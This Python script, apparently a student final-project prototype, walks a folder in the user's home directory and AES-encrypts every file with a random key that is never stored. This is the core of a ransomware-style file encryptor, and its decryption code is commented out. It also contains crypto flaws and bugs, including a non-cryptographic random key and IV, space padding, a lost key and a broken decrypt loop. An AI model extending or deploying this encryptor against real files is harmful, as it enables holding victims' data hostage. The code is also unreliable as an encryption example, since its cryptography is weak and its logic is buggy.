import os
import pathlib
import random
import struct
from Crypto.Cipher import AES
from pprint import pprint
import sys

def encrypt_file(key, in_filename):
    out_filename = in_filename + '.enc'
    iv = ''.join(random.choice('0123456789') for n in range(16))
    print(sys.getsizeof(iv[1]))
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    filesize = os.path.getsize(in_filename)
    chunksize = 64*1024
    with open(in_filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            outfile.write(struct.pack('<Q', filesize))
            outfile.write(iv.encode('utf-8'))
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += (' ' * (16 - len(chunk) % 16)).encode('utf-8')

                outfile.write(encryptor.encrypt(chunk))

def decrypt_file(key, in_filename):
    chunksize=24*1024
    out_filename = os.path.splitext(in_filename)[0]

    with open(in_filename, 'rb') as infile:
        origsize = struct.unpack('<Q', infile.read(struct.calcsize('Q')))[0]
        iv = infile.read(16)
        decryptor = AES.new(key, AES.MODE_CBC, iv)

        with open(out_filename, 'wb') as outfile:
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                outfile.write(decryptor.decrypt(chunk))

            outfile.truncate(origsize)


user_home = pathlib.Path.home()
target_folder = "dev/cs460/finalProject/testFolder"
start_path = os.path.join(user_home, target_folder)
print("Running folder scan on " + start_path)

dir_list = []
file_list = []
key  = ''.join(random.choice('0123456789abcdef') for n in range(32))
for root, dirs, files in os.walk(start_path):
    for name in files:
        # print(os.path.join(root, name))
        encrypt_file(key, os.path.join(root, name))
        file_list.append(os.path.join(root, name))
    for name in dirs:
        # print(os.path.join(root, name))
        #encrypt_file(key, os.path.join(root, name))
        dir_list.append(os.path.join(root, name))

print("\nDirectories:")
print(dir_list)
print("\nFolders:")
pprint(file_list)

#To decrypt the files, uncomment the following lines
# for root, dirs, files in os.walk(start_path):
#     for name in file_list:
#         decrypt_file(key, name)
